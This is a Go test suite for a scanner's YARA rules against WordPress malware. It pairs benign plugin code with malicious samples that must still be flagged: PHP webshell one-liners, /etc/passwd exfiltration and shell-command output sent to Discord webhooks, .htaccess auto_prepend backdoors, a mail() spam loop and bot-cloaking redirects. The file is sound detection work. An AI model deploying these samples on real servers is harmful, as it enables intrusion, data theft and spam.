//go:build yara

package yara

import (
	"path/filepath"
	"runtime"
	"testing"
)

func loadRepoYaraScanner(t *testing.T) *Scanner {
	t.Helper()
	_, thisFile, _, ok := runtime.Caller(0)
	if !ok {
		t.Fatal("runtime.Caller failed")
	}
	configsDir := filepath.Join(filepath.Dir(thisFile), "..", "..", "configs")
	scanner, err := NewScanner(configsDir)
	if err != nil {
		t.Fatalf("loading repo YARA rules: %v", err)
	}
	if scanner == nil || scanner.RuleCount() == 0 {
		t.Fatal("expected YARA rules to load")
	}
	return scanner
}

// FP reconstructions for the 2026-04-17 production unzip event.
// Wordfence, WPML, and Salient are real WordPress plugins whose files
// legitimately contain tokens the rules key on.

func TestBackdoorHtaccessAutoPrepend_WordfenceWafInstallView(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	// Wordfence waf-install.php: a PHP admin page that documents the
	// auto_prepend_file directive in translated UI strings. The token
	// appears inside <?php translation calls and HTML, never as an actual
	// .htaccess directive.
	legit := []byte(`<?php
if (!defined('ABSPATH')) exit;
?>
<div class="wrap">
<p><?php echo wp_kses(__('The Wordfence Firewall runs via a PHP setting called <code>auto_prepend_file</code>, which ensures it runs first.', 'wordfence')); ?></p>
<pre><?php echo esc_html($currentAutoPrependFile); ?></pre>
</div>
`)
	if hasYaraRule(scanner.ScanBytes(legit), "backdoor_htaccess_auto_prepend") {
		t.Error("backdoor_htaccess_auto_prepend FP: matched Wordfence waf-install.php (directive name inside PHP source, not a real .htaccess)")
	}

	// Real .htaccess attack: no PHP tag, directive points at a dropped shell.
	malicious := []byte(`php_value auto_prepend_file "/home/user/public_html/.cache/.x.php"
`)
	if !hasYaraRule(scanner.ScanBytes(malicious), "backdoor_htaccess_auto_prepend") {
		t.Error("backdoor_htaccess_auto_prepend regression: real .htaccess backdoor was not detected")
	}
}

func TestBackdoorIconcacheDisguise_WPMLTranslationPackage(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	// WPML class-wpml-element-translation-package.php: has <?php, uses
	// variable-variable calls for dispatch (a common PHP pattern), and
	// references base64 somewhere. No icon/cache/thumb filename pattern,
	// no system/shell_exec/passthru/proc_open/popen.
	legit := []byte(`<?php
class WPML_Element_Translation_Package {
	public function process($element) {
		$handler = $this->handlers[$element->type];
		$result = $handler($element);
		$encoded = base64_encode($result->payload);
		return array('data' => base64_decode($encoded));
	}
}
`)
	if hasYaraRule(scanner.ScanBytes(legit), "backdoor_iconcache_disguise") {
		t.Error("backdoor_iconcache_disguise FP: matched WPML translation-package (variable-variable dispatch + base64 is not an icon-cache backdoor)")
	}

	// Real icon-cache disguise: filename looks like a cache file, contains
	// system() dispatched through base64_decode.
	malicious := []byte(`<?php
// file dropped as icon.php
$cmd = base64_decode('bHM=');
system($cmd);
`)
	if !hasYaraRule(scanner.ScanBytes(malicious), "backdoor_iconcache_disguise") {
		t.Error("backdoor_iconcache_disguise regression: system($base64) in icon.php was not detected")
	}
}

func TestMailerMassSenderYARA_WordfenceIssues(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	// Wordfence wfIssues.php: iterates issues, has fgets() in log handling
	// hundreds of lines away from a substring 'mail(' buried inside
	// wp_mail() / is_email() / wfmail(). No mass-send behavior.
	legit := []byte(`<?php
class wfIssues {
	public function __construct() {
		$handle = fopen('/tmp/wf-log', 'r');
		while ($line = fgets($handle)) {
			$this->log[] = trim($line);
		}
		fclose($handle);
	}
	public function sendNotification($recipient) {
		if (is_email($recipient)) {
			wp_mail($recipient, 'Wordfence Alert', 'Issues found');
		}
	}
	public function iterateIssues() {
		foreach ($this->issues as $issue) {
			$this->log[] = $issue->getSummary();
		}
	}
}
`)
	if hasYaraRule(scanner.ScanBytes(legit), "mailer_mass_sender") {
		t.Error("mailer_mass_sender YARA FP: matched Wordfence wfIssues.php (fgets in one method, mail( substring in another method, no proximity)")
	}

	// Real mass-sender: single loop body calls mail() for each line read.
	malicious := []byte(`<?php
$fh = fopen('list.txt','r'); while ($e = fgets($fh)) { mail($e, 'x', 'y'); }
`)
	if !hasYaraRule(scanner.ScanBytes(malicious), "mailer_mass_sender") {
		t.Error("mailer_mass_sender YARA regression: real tight loop was not detected")
	}
}

func TestSpamWpFooterInjection_SalientVCFrontendEditor(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	// Salient's VC frontend editor hooks into wp_footer, uses add_action,
	// and inlines base64-encoded SVG icons. No echoed external link.
	legit := []byte(`<?php
class Vc_Frontend_Editor {
	public function __construct() {
		add_action('wp_footer', array($this, 'render_toolbar'));
	}
	public function render_toolbar() {
		$icon_svg = base64_decode('PHN2Zy8+'); // inline icon asset
		echo '<div id="vc-editor" style="display:none" data-icon="' . esc_attr($icon_svg) . '"></div>';
	}
}
`)
	if hasYaraRule(scanner.ScanBytes(legit), "spam_wp_footer_injection") {
		t.Error("spam_wp_footer_injection FP: matched Salient VC frontend editor (wp_footer hook + base64 inline asset is not spam)")
	}

	// Real footer spam: echoes external link via wp_footer hook with obfuscation.
	malicious := []byte(`<?php
add_action('wp_footer', function() {
	$link = base64_decode('aHR0cDovL3NwYW0uZXhhbXBsZS8=');
	echo '<a href="http://spam.example/" rel="dofollow" style="display:none">x</a>';
});
`)
	if !hasYaraRule(scanner.ScanBytes(malicious), "spam_wp_footer_injection") {
		t.Error("spam_wp_footer_injection regression: real footer link injection was not detected")
	}
}

// FP reconstruction for the 2026-04-28 cPanel package-restore event.
//
// UpdraftPlus (popular WP backup plugin) ships class-updraftplus.php that
// uses popen() and proc_open() to invoke mysqldump with escapeshellarg-built
// arguments. The plugin also handles AJAX requests, so it references
// $_POST/$_REQUEST. The old YARA rule fired "any of dangerous_function and
// any of superglobal" anywhere in the file - never requiring proximity. The
// fix: require the dangerous function to take a superglobal directly (or
// through a thin decoder wrapper), which is the actual webshell shape.

func TestWebshellGenericPassthru_UpdraftPlusBackupClass(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	// UpdraftPlus class-updraftplus.php: popen on a constructed mysqldump
	// command (escapeshellarg) plus AJAX handlers that read $_POST. The
	// dangerous function and the superglobal never meet as caller/callee.
	legit := []byte(`<?php
class UpdraftPlus {
    public function ajax_action() {
        if (isset($_POST['subaction'])) {
            $sub = sanitize_text_field($_POST['subaction']);
            return $this->dispatch($sub);
        }
    }

    private function find_working_sqldump() {
        $cmd = escapeshellarg('/usr/bin/mysqldump') . ' --version';
        $handle = popen($cmd, "r");
        if (!$handle) return false;
        $out = stream_get_contents($handle);
        pclose($handle);
        return $out;
    }

    private function backup_db_tables($host, $user, $pass, $db, $outfile) {
        $args = " --user=" . escapeshellarg($user) .
                " --password=" . escapeshellarg($pass) .
                " --host=" . escapeshellarg($host) .
                " " . escapeshellarg($db);
        $exec = escapeshellarg('/usr/bin/mysqldump') . $args . " > " . escapeshellarg($outfile);
        $descriptors = [0=>['pipe','r'], 1=>['pipe','w'], 2=>['pipe','w']];
        $proc = proc_open($exec, $descriptors, $pipes);
        proc_close($proc);
    }
}
`)
	if hasYaraRule(scanner.ScanBytes(legit), "webshell_generic_passthru") {
		t.Error("webshell_generic_passthru FP: matched UpdraftPlus class-updraftplus.php (popen/proc_open with escapeshellarg-built command, AJAX handlers using sanitize_text_field; superglobal never reaches dangerous function)")
	}

	// Real webshell: direct superglobal as argument to dangerous function.
	malicious := []byte(`<?php
@passthru($_REQUEST['c']);
`)
	if !hasYaraRule(scanner.ScanBytes(malicious), "webshell_generic_passthru") {
		t.Error("webshell_generic_passthru regression: direct passthru($_REQUEST) shell was not detected")
	}

	// Real webshell with decoder wrapper: still direct superglobal feed.
	maliciousWrapped := []byte(`<?php
@system(stripslashes($_POST['cmd']));
`)
	if !hasYaraRule(scanner.ScanBytes(maliciousWrapped), "webshell_generic_passthru") {
		t.Error("webshell_generic_passthru regression: stripslashes-wrapped superglobal feed was not detected")
	}

	maliciousBase64 := []byte(`<?php
@shell_exec(base64_decode($_POST['x']));
`)
	if !hasYaraRule(scanner.ScanBytes(maliciousBase64), "webshell_generic_passthru") {
		t.Error("webshell_generic_passthru regression: base64_decode-wrapped superglobal feed was not detected")
	}
}

// FP reconstruction: Elementor Pro's pro-elements/modules/forms/actions/
// discord.php embeds the Discord webhook URL twice (once as a placeholder
// in the form-builder UI, once as a strpos() guard before posting via
// wp_remote_post). The previous YARA rule fired on the URL alone -
// "any of them" with the URL strings as the only matchable patterns -
// which produced a Critical/High YARA alert on every legitimate Elementor
// Pro form integration. The YAML rule with the same name was tightened
// in the same change set to require an exfiltration indicator alongside
// the URL; the YARA rule must do the same or the FP just moves into a
// different alert pipeline.

func TestDropperDiscordWebhookYARA_ElementorProFormAction(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	// Shape reconstructed from the actual file: webhook URL referenced
	// twice as configuration data (placeholder + guard), wp_remote_post
	// used to deliver, no file reads, no shell exec, no eval.
	legit := []byte(`<?php
namespace ElementorPro\Modules\Forms\Actions;
class Discord extends Action_Base {
    public function get_name() { return 'discord'; }
    public function register_settings_section($widget) {
        $widget->add_control('discord_webhook', [
            'placeholder' => 'https://discordapp.com/api/webhooks/',
        ]);
    }
    public function run($record, $ajax_handler) {
        $settings = $record->get('form_settings');
        if (false === strpos($settings['discord_webhook'], 'https://discordapp.com/api/webhooks/')) {
            return;
        }
        $response = wp_remote_post($settings['discord_webhook'], [
            'body' => wp_json_encode($settings),
            'headers' => ['Content-Type' => 'application/json; charset=utf-8'],
        ]);
    }
}
`)
	if hasYaraRule(scanner.ScanBytes(legit), "dropper_discord_webhook") {
		t.Error("dropper_discord_webhook YARA FP: matched Elementor Pro discord.php (webhook URL as configuration + wp_remote_post; no exfil indicator)")
	}

	// Real exfil dropper: posts /etc/passwd contents to a hardcoded
	// webhook. Must keep firing.
	maliciousExfil := []byte(`<?php
$d = file_get_contents('/etc/passwd');
file_get_contents('https://discord.com/api/webhooks/123/abc?content=' . urlencode($d));
`)
	if !hasYaraRule(scanner.ScanBytes(maliciousExfil), "dropper_discord_webhook") {
		t.Error("dropper_discord_webhook YARA regression: real /etc/passwd to Discord webhook exfil was not detected")
	}

	// Real C2: shell-exec on superglobal input, results posted to
	// webhook. Must keep firing.
	maliciousC2 := []byte(`<?php
$out = shell_exec($_POST['cmd']);
$ch = curl_init('https://discordapp.com/api/webhooks/999/zzz');
curl_setopt($ch, CURLOPT_POSTFIELDS, ['content' => $out]);
curl_exec($ch);
`)
	if !hasYaraRule(scanner.ScanBytes(maliciousC2), "dropper_discord_webhook") {
		t.Error("dropper_discord_webhook YARA regression: shell_exec C2 with Discord callback was not detected")
	}
}

// FP reconstruction for the 2026-05-14 cPanel 009-phpconf hook re-touch.
//
// cPanel's 009-phpconf hook rewrites PHP-handler directives in every vhost
// .htaccess on PHP/EasyApache changes. That re-touch triggered a realtime
// YARA rescan and surfaced two long-standing FP classes on hosts running
// stock WordPress security plugins.

// Really Simple Security (formerly Really Simple SSL) installs an
// auto_prepend_file directive pointing at wp-content/advanced-headers.php
// to enforce hardening headers before WordPress boots. The directive is
// the plugin's contract with PHP-FPM; it ships on every active install.
// Treat it like the Wordfence/iThemes/Sucuri exclusions: anchor on the
// product-specific path tail so an attacker cannot drop a shell anywhere
// just by calling it advanced-headers.php.
func TestBackdoorHtaccessAutoPrepend_ReallySimpleSecurityPlugin(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	// Verbatim shape from a production .htaccess: real .htaccess (no PHP
	// tag) with the Really Simple Security prepend block. Directive
	// target is the plugin's own wp-content/advanced-headers.php file.
	legit := []byte(`# BEGIN LSCACHE
<IfModule LiteSpeed>
CacheLookup on
</IfModule>
# END LSCACHE
#Begin Really Simple Auto Prepend File
<IfModule mod_php7.c>
php_value auto_prepend_file /home/site/public_html/wp-content/advanced-headers.php
</IfModule>
<IfModule mod_php.c>
php_value auto_prepend_file /home/site/public_html/wp-content/advanced-headers.php
</IfModule>
<Files ".user.ini">
<IfModule mod_authz_core.c>
Require all denied
</IfModule>
</Files>
#End Really Simple Auto Prepend File
`)
	if hasYaraRule(scanner.ScanBytes(legit), "backdoor_htaccess_auto_prepend") {
		t.Error("backdoor_htaccess_auto_prepend FP: matched Really Simple Security advanced-headers.php prepend block (legitimate WP plugin contract)")
	}

	// Attacker tries to bypass by naming the dropped shell advanced-headers.php
	// in a path outside wp-content. The generated-block guard must not hide it.
	bypass := []byte(`php_value auto_prepend_file "/tmp/advanced-headers.php"
`)
	if !hasYaraRule(scanner.ScanBytes(bypass), "backdoor_htaccess_auto_prepend") {
		t.Error("backdoor_htaccess_auto_prepend regression: attacker-named advanced-headers.php outside /wp-content must still fire")
	}

	// The path alone is not trusted. Without the generated Really Simple
	// Auto Prepend File block around it, an attacker choosing the plugin
	// target path must still fire.
	exactPathNoBlock := []byte(`php_value auto_prepend_file "/home/site/public_html/wp-content/advanced-headers.php"
`)
	if !hasYaraRule(scanner.ScanBytes(exactPathNoBlock), "backdoor_htaccess_auto_prepend") {
		t.Error("backdoor_htaccess_auto_prepend regression: standalone advanced-headers.php path must still fire")
	}

	// A legitimate generated block does not suppress a second suspicious
	// prepend elsewhere in the same .htaccess.
	mixed := append([]byte{}, legit...)
	mixed = append(mixed, []byte(`php_value auto_prepend_file "/home/victim/public_html/.cache/.x.php"
`)...)
	if !hasYaraRule(scanner.ScanBytes(mixed), "backdoor_htaccess_auto_prepend") {
		t.Error("backdoor_htaccess_auto_prepend regression: malicious prepend alongside RSSSL block must still fire")
	}

	// Real .htaccess attack: dropped shell, unrelated name.
	malicious := []byte(`php_value auto_prepend_file "/home/victim/public_html/.cache/.x.php"
`)
	if !hasYaraRule(scanner.ScanBytes(malicious), "backdoor_htaccess_auto_prepend") {
		t.Error("backdoor_htaccess_auto_prepend regression: real shell drop must keep firing")
	}
}

// Anti-scraper UA lists plus the standard WordPress HTTPS-force redirect
// (RewriteRule ^(.*)$ https://%{HTTP_HOST}/$1) are not cloaked spam.
// Real cloak kits redirect bot user-agents to an external spam host via
// Apache redirect flags. Require both signals (external host + redirect flag) so the rule
// distinguishes cloak from same-host SSL force or [F] block lists.
func TestSpamHtaccessRedirect_WPHTTPSForceAndBotBlockNoLongerFire(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	// Verbatim shape from a production .htaccess: anti-scraper bot block
	// (bingbot in a [F] block list) plus WordPress HTTPS-force redirect.
	// Both patterns are legitimate and unrelated to spam cloaking.
	legit := []byte(`<IfModule mod_rewrite.c>
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} (?i)bingbot|ahrefs|semrush|mj12bot|dotbot [OR]
RewriteCond %{HTTP_USER_AGENT} (?i)crawler|bot|spider
RewriteCond %{QUERY_STRING} (^|&)filter_ [NC]
RewriteRule ^ - [F]
</IfModule>

<IfModule mod_rewrite.c>
RewriteEngine On
RewriteCond %{HTTPS} off
RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
</IfModule>
`)
	if hasYaraRule(scanner.ScanBytes(legit), "spam_htaccess_redirect") {
		t.Error("spam_htaccess_redirect FP: matched anti-scraper [F] block list combined with same-host HTTPS-force (no external redirect host, no cloak)")
	}

	// Real cloak: bot UA targeted, redirect to external spam TLD with R=30x.
	malicious := []byte(`RewriteCond %{HTTP_USER_AGENT} (Googlebot|bingbot) [NC]
RewriteRule ^(.*)$ http://viagra-cheap.xyz/buy [R=302,L]
`)
	if !hasYaraRule(scanner.ScanBytes(malicious), "spam_htaccess_redirect") {
		t.Error("spam_htaccess_redirect regression: bot-UA cloak redirect to external spam host must keep firing")
	}

	// Real cloak via 301 with subdomain host.
	malicious301 := []byte(`RewriteCond %{HTTP_USER_AGENT} Googlebot [NC]
RewriteRule ^(.*)$ https://buy.pharma-spam.top/ad [R=301,L]
`)
	if !hasYaraRule(scanner.ScanBytes(malicious301), "spam_htaccess_redirect") {
		t.Error("spam_htaccess_redirect regression: 301 cloak with subdomain host must keep firing")
	}

	// Bare [R] is a redirect too. Apache defaults it to a temporary 302.
	maliciousBareR := []byte(`RewriteCond %{HTTP_USER_AGENT} bingbot [NC]
RewriteRule ^(.*)$ http://doorway-spam.example/$1 [R,L]
`)
	if !hasYaraRule(scanner.ScanBytes(maliciousBareR), "spam_htaccess_redirect") {
		t.Error("spam_htaccess_redirect regression: bare [R] cloak redirect must keep firing")
	}

	// Long-form redirect flags are equivalent to R/R=30x.
	maliciousRedirectFlag := []byte(`RewriteCond %{HTTP_USER_AGENT} Baidu [NC]
RewriteRule ^(.*)$ https://spam-doorway.example/p [redirect=permanent,L]
`)
	if !hasYaraRule(scanner.ScanBytes(maliciousRedirectFlag), "spam_htaccess_redirect") {
		t.Error("spam_htaccess_redirect regression: long-form redirect cloak must keep firing")
	}
}
